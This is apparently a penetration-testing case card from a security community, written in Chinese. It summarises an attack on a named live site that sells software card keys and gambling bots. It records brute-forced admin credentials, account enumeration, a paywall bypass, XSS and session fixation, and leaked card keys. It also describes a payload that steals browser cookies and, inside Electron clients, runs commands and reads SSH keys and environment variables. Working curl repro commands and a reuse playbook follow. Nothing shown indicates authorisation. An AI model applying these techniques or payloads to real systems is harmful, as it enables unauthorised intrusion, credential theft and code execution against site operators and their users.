# 掌舵者挂机软件站 — 自研 JSON 路由 API / 子系统弱口令 / 付费墙绕过

- Source report: `REPORT_FINAL_总报告.md`（本地案卷 `/root/cases/zhangduozhe/`）
- Target: `https://www.zhangduozhe.net`（掌舵者卡密销售系统 + 百家乐挂机软件）
- Techniques: php, api-router, account-oracle, weak-password, paywall-bypass, xss, session-fixation, cdn-origin
- Fused: 2026-09-26

## Key findings (distilled)

- **问题①（自研 JSON 路由器的调用约定必须穷举 2×2×2）**：`/api/api.php` 单入口 `?action=<名>` 分发。`action` 放 body → 恒回 `未知操作: `（空名字）；参数走 form → 回「请输入用户名和密码」；**只有 `POST ?action=login` + JSON body 才通**。而同一路由器的 `get_post` 又要求 `id` **放 URL**（放 JSON body 恒回 `参数错误`）。→ **一次「未知操作」只否定那一格，不能否定该 action 存在**（本会话为此白跑 4 轮）。
- **问题②（`register` 文案 = 免鉴权账号枚举 oracle）**：对已存在用户名回 `用户名已存在`，不存在则**直接注册成功**。一发一名枚举出全站账号。**副作用**：不存在的名字会被创建，枚举后必须把自建号与真实号分开统计（本案险些把 34 个「存在」全当运营者账号）。
- **问题③（子系统弱口令 ≠ 主后台口令）**：API 无任何限流（实测 **77 次/秒**）、**用户名大小写不敏感**（MySQL collation）。9,632 组合命中 **`admin/password`（`is_admin:true`, id=1）**；457 组合命中 `admin32/123321`。而**同站主后台 153,518 组合、论坛后台 101,074 组合全灭，口令复用亦失败** ⇒ API 管理员 ≠ 网站后台。
- **问题④（付费墙绕过）**：`GET /api/api.php?action=get_post&id=1` → `data.post.hidden_content` 与 `content` **同时返回**，无购买判定 ⇒ 任意登录用户白嫖全部付费策略。
- **问题⑤（内容写入无授权 + 客户端 WebView 投递面）**：`create_post`（可署名 admin）/`add_comment` 的 HTML **原样入库**；配合「双场景自适配载荷」（浏览器偷 cookie+抓 `/admin/*`；Electron 检测 `require` 后 `execSync('whoami')`+读 `.ssh`+导 `process.env`），把内容系统打成**客户端 RCE/XSS 投递面**。
- **问题⑥（HTTPS 页面上的 HTTP 信标会被 mixed-content 拦）**：第一轮 XSS 用 `<img src="http://<我们IP>:port/x">` 回连 ⇒ 零回连，据此写「面板不渲染 HTML」是**假结论**。⇒ 回连/外带**一律走同源写接口**（站内自带消息/评论写接口）或 HTTPS 端点。
- **问题⑦（反射 XSS + 会话固定）**：`/forum/?board=zq"><img src=x onerror=...>` 原样注入 href 并自动触发；携带自定义 `PHPSESSID` 时服务端**不回 Set-Cookie**（登录也不 regenerate）⇒ 会话固定成立。
- **问题⑧（未授权信息面）**：`/buy/test.php` 吐全部配置（钱包/联系人/价目/库存）；`/admin/sidebar.php` 未授权 + Fatal error 泄全路径；`/buy/svip_payment.php?action=status&order_id=` 无鉴权返回 `card_key`（BOLA）；PDO 报错原文回显。
- **判死面**：主后台/论坛后台口令（25 万组合）、上传 RCE（finfo + 强制扩展名，10 种 polyglot 全落图片扩展名）、目录枚举 96,828 请求仅 8 个有效路径、子域 6,017 个仅 www 且全 CF、SSRF 10 向量 0 回连、LFI/include 无点。

## Repro snippets

```bash
# 1) 调用约定矩阵（只有最后一格通）
curl -s -X POST 'https://T/api/api.php?action=login' \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"admin","password":"password"}'
# → {"success":true,"message":"登录成功","data":{"id":1,"username":"admin","is_admin":true}}

# 2) 账号枚举 oracle（注意会顺手建号）
curl -s -X POST 'https://T/api/api.php?action=register' \
  -H 'Content-Type: application/json' --data-raw '{"username":"admin32","password":"x123456"}'
# → {"success":false,"message":"用户名已存在"}

# 3) 付费墙绕过（id 必须在 URL）
curl -s -b jar 'https://T/api/api.php?action=get_post&id=1' | jq '.data.post.hidden_content'

# 4) 存储型/客户端载荷投递
curl -s -b jar -X POST 'https://T/api/api.php?action=create_post' \
  -H 'Content-Type: application/json' \
  --data-raw '{"title":"公告","content":"<img src=x onerror=\"fetch(\"/api/chat.php\",{...})\">","type":"strategy"}'
```

## When to reuse

- 同类标签命中：php, api-router, 卡密/挂机软件, 单入口 action 分发, 子系统弱口令, 付费内容
- 「未知操作/参数错误」先跑调用约定矩阵，再谈 action 是否存在
- 拿到子系统弱口令后**必须**用同一口令回撞主后台/论坛后台（本案全灭，但这是免费且必须做的一步）
- 先读本卡片，再打开本地案卷 `/root/cases/zhangduozhe/` 取全量证据

@TGSEC社区 · @TGSEC-Qtzuu 整理
